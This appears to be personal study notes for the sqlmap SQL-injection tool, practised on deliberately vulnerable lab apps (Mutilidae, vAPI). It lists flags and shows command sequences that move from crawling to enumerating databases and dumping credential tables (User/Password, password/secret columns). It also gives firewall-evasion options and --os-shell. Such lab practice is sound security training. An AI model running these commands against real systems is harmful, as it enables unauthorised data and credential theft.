https://www.youtube.com/watch?v=QsMkQMKsIII
https://www.youtube.com/watch?v=2YD4vygeghM

https://www.kali.org/tools/sqlmap/

https://sqlmap.org/
https://github.com/sqlmapproject/sqlmap/wiki/FAQ

Overview
- Techniques
- Crawl
- Enumeration
- Batch 
- Risk
- Level
- Threads
- Verbosity
- Proxy
- SQL injection via burp suite

# FLAGS
-h                      (help)
-u                      (url)
-v                      (verbosity from 0-6)
-r                      (read saved request)
--crawl                 (define the depth to crawl web page from (1-10))
--batch                 (use default options instead of answering yes no)
--technique             (specify technique you want to use if specific any)
--threads               (for big website we can use multiple connections from 1-10)
--risk                  (risk is defined to avoid harm to website from 1-3 , 1 is ok which 3 can even update db usng update payloads)
--level                 (to increase attack depth from 1-5)
--forms                 (tells sqlmap that this is a form and you have to perform on this only)
--data                  (you can provide data ie body of post request)
--headers               (add header you want to include in requests)
--user-agent            (add user-agent to bypass firewall detecting user-agent and blocking you)
--mobile                (if you wanto use mobile as useragent)
--data                  (to send data in POST)
--proxy                 (to send request to burp before the target)
--cookie                (to give your cookie which form filing)
-flush-session          (keeps cleaning sqlmap session)
-output-dir             (save the output in a directory specifies)
-tamper                 (to convert your payload in some other form to bypass firewall blocking)
--dump                  (if we need all data)
--dump-all              (bring all the data)
--comment               (brings you any hidden comment in db)
--os-shell,--os-cmd     (gives you shell if db if user is root)


# User Enumeration
Once you get the vulnerable url, you then find the detials using that url

--current-user          (bring details of current user)
--current-db            (bring details of current db)
--hostname              (bring hostnaame)
--dbs                    (bring details of all db that exist)
-D                      (specify the database name)
-T                      (specify the table name)
--tables                (bring tables)
--columns               (bring columns also gives datatype)

# Techniques

B: Boolean based
E: Error-based
U: Union query based
S: Stacked queries
T: Time based blind
Q: Inline queries

# Level
increases the depth in which it test for example for level 2 it will get into cookies for 3 it will even go into user agent by default it is 1 and max is 5

use of risk and level often increases flase positives

# verbosity
0: Show only python tracebacks,error and critical messages 
1: show also the information and warning messages    (by default)
2: show also debug messages
3: show also tha payloads injected
4: show also the HTTP requests
5: show also the HTTP response headers
6: shwo also the HTTP response page content

# tampers
- sqlmap --list-tampers

# Basic commands

- sqlmap -u "url" --crawl 2

- sqlmap -u "url" --crawl 2 --batch

- sqlmap -u "url" --crawl 2 --batch --technique="U"

- sqlmap -u "url" --crawl 2 --batch --technique="U" --threads 5

- sqlmap -u "url" --crawl 2 --batch --technique="U" --threads 5 --risk 1

- sqlmap -u "url" --crawl 2 --batch --technique="U" --threads 5 --level 2

- sqlmap -u "url" --crawl 2 --batch --technique="U" --threads 5 --level 2 -v 4

- sqlmap -u "vul parm url" --current-user --current-db --hostname --batch

- sqlmap -u "vul param url" --dbs

- sqlmap -u "vul parm url" -D dbname --tables

- sqlmap -u "vul parm url" -D dbname -T tablename --dump

- sqlmap -u "vul parm url" -D dbname -T tablename --column

- sqlmap -u "vul parm url" -D dbname --dump-all

- sqlmap -u "vul parm url" --crawl 3 --output-dir "home/desktop"

- sqlmap -u "vul parm url" --crawl 3 --headers="Referer:abc.com" -v 4

- sqlmap -u "vul parm url" --crawl 3 --user-agent="GECKO_Chrome" -v 4

- sqlmap -u "vul parm url" --crawl 3 --mobile -v 4

- sqlmap --list-tampers

- sqlmap -u "url" --crawl 3 --tamper=base64encode -v 3 --batch

- sqlmap - "url" --data="uname=abc&pass=pass&login=submit"

- sqlmap -u "url" --crawl 2 --proxy="http://127.0.0.1:5555" --batch

- sqlmap -r requestfile --batch     (make sure its saved as .txt,.txt works best for sqlmap)




# tried on Mutilidae

- sqlmap -r req.txt --dbs --current-db --current-user --hostname

- sqlmap -r req.txt -D mysql tables 

- sqlmap -r req.txt -D mysql -T user --columns  

- sqlmap -r req.txt -D mysql -T user -C User,Password --dump 


- sqlmap -u http://192.168.1.26/vapi/api8/user/login --data="username=u&password=p" -p username --dbs

- sqlmap -u http://192.168.1.26/vapi/api8/user/login --data="username=u&password=p" -p username -D vapi --tables

- sqlmap -u http://192.168.1.26/vapi/api8/user/login --data="username=u&password=p" -p username -D vapi -T a_p_i8_users --columns

- sqlmap -u http://192.168.1.26/vapi/api8/user/login --data="username=u&password=p" -p username -D vapi -T a_p_i8_users -C password,secret,username --dump